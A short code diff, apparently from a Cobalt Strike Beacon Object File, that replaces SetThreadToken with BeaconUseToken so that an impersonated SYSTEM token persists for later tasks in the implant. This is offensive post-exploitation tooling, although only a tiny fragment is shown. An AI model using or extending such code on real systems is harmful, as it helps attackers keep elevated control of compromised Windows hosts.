@@ -402,10 +402,10 @@ void go(char* args, int len)
 
     if (use_token)
     {
-        // Apply token to current thread
-        if (!ADVAPI32$SetThreadToken(NULL, hToken))
+        /* BeaconUseToken stores g_StoredToken so later tasks / ps run -i keep SYSTEM. */
+        if (!BeaconUseToken(hToken))
         {
-            BeaconPrintf(CALLBACK_ERROR, "[-] SetThreadToken failed. Error: %d\n", KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "[-] BeaconUseToken failed. Error: %d\n", KERNEL32$GetLastError());
         }
         else
         {
